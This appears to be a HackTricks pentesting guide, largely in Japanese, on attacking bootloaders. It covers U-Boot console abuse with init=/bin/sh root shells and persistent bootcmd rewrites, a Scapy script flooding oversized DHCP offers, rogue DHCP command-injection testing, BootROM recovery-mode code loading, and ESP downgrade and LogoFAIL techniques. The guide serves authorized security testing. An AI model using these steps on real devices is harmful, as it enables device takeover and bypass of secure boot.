# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

以下の手順は、デバイスの起動設定を変更し、U-Boot や UEFI クラスのローダーなどの bootloader をテストする際に推奨されます。早期のコード実行の取得、署名/ロールバック保護の評価、リカバリやネットワークブート経路の悪用に集中してください。

## U-Boot quick wins and environment abuse

1. Access the interpreter shell
- 起動中に既知のブレークキー（多くの場合は任意のキー、0、space、またはボード固有の "magic" シーケンス）を `bootcmd` が実行される前に押して、U-Boot プロンプトに落とします。

2. Inspect boot state and variables
- 有用なコマンド:
- `printenv` (環境をダンプ)
- `bdinfo` (ボード情報、メモリアドレス)
- `help bootm; help booti; help bootz` (サポートされるカーネル起動方法)
- `help ext4load; help fatload; help tftpboot` (使用可能なローダー)

3. Modify boot arguments to get a root shell
- カーネルが通常の init の代わりにシェルを落とすように `init=/bin/sh` を追加します:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- ネットワークを設定して LAN からカーネル/FIT イメージを取得します:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- env ストレージが書き込み保護されていなければ、制御を永続化できます:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- フォールバック経路に影響する `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` のような変数を確認してください。誤設定された値は何度もシェルに入れるきっかけを与える可能性があります。

6. Check debug/unsafe features
- 次のような項目を探してください: `bootdelay` > 0、`autoboot` 無効、制限のない `usb start; fatload usb 0:1 ...`、シリアル経由での `loady`/`loads` が可能、信頼できないメディアからの `env import`、署名チェックなしでロードされるカーネル/ramdisk。

7. U-Boot image/verification testing
- プラットフォームが FIT イメージでセキュア/検証済みブートを主張している場合、署名なしや改ざんしたイメージの両方を試してください:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` がない、または古い `verify=n` の挙動がある場合、任意のペイロードを起動できることがよくあります。

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- U-Boot のレガシーな BOOTP/DHCP 処理にはメモリ安全性の問題がありました。例えば CVE‑2024‑42040 は、細工した DHCP 応答によるメモリ情報の開示を記述しており、U-Boot メモリからワイヤ上にバイトを leak する可能性があります。DHCP/PXE のコードパスに対して、過度に長い/エッジケースの値（option 67 bootfile-name、vendor オプション、file/servername フィールドなど）を与えて、ハングや leaks の有無を観察してください。
- ネットブート中のブートパラメータをストレスさせるための最小限の Scapy スニペット:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- また PXE の filename フィールドが OS 側のプロビジョニングスクリプトに渡されたときに十分にサニタイズされずにシェル/ローダーのロジックに渡されるかどうかも検証してください。

9. Rogue DHCP server command injection testing
- 不正な DHCP/PXE サービスを立て、filename やオプションフィールドに文字を注入してブートチェーンの後段でコマンドインタプリタに到達できるか試してください。Metasploit の DHCP auxiliary、`dnsmasq`、またはカスタム Scapy スクリプトが有効です。まずはラボネットワークを分離してから行ってください。

## SoC ROM recovery modes that override normal boot

多くの SoC は BootROM の "loader" モードを公開しており、フラッシュイメージが無効でも USB/UART 経由でコードを受け付けます。secure-boot の fuse が焼かれていない場合、チェーンの非常に早い段階で任意のコード実行が可能になります。

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

デバイスに secure-boot 用の eFuses/OTP が焼かれているかどうかを評価してください。焼かれていない場合、BootROM のダウンロードモードは多くの場合、上位レベルの検証（U-Boot、カーネル、rootfs）をバイパスして、SRAM/DRAM から直接最初のステージのペイロードを実行します。

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- EFI System Partition (ESP) をマウントして、ローダーコンポーネントを確認します: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, ベンダーロゴのパスなど。
- Secure Boot の無効化や revocations (dbx) が最新でない場合、ダウングレードしたり既知の脆弱な署名済みブートコンポーネントで起動を試してください。プラットフォームが古い shim/bootmanager をまだ信頼している場合、ESP から自前のカーネルや `grub.cfg` を読み込んで永続性を得られることが多いです。

11. Boot logo parsing bugs (LogoFAIL class)
- 多くの OEM/IBV ファームウェアは、DXE でブートロゴを処理する際の画像パースの欠陥に対して脆弱でした。攻撃者が ESP 上のベンダー固有パス（例: `\EFI\<vendor>\logo\*.bmp`）に細工した画像を置ける場合、Secure Boot が有効でも早期ブート中にコード実行が可能になることがあります。プラットフォームがユーザ提供のロゴを受け入れるか、OS からそのパスに書き込み可能かをテストしてください。

## Hardware caution

初期ブート中に SPI/NAND フラッシュに触れる（例: 読み出しを回避するためにピンをグラウンドする）際は注意し、必ずフラッシュのデータシートを参照してください。タイミングを誤ったショートはデバイスやプログラマを壊す可能性があります。

## Notes and additional tips

- `env export -t ${loadaddr}` と `env import -t ${loadaddr}` を試して、環境の blob を RAM とストレージ間で移動します。プラットフォームによっては、取り外し可能なメディアから認証なしに env をインポートできるものがあります。
- `extlinux.conf` 経由で起動する Linux ベースのシステムでは、ブートパーティションの `APPEND` ラインを変更して `init=/bin/sh` や `rd.break` を注入するだけで、署名チェックが強制されていない場合は永続化できることが多いです。
- ユーザーランドに `fw_printenv/fw_setenv` がある場合、`/etc/fw_env.config` が実際の env ストレージに一致しているか検証してください。オフセットが誤っていると、誤った MTD 領域を読み書きしてしまいます。

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
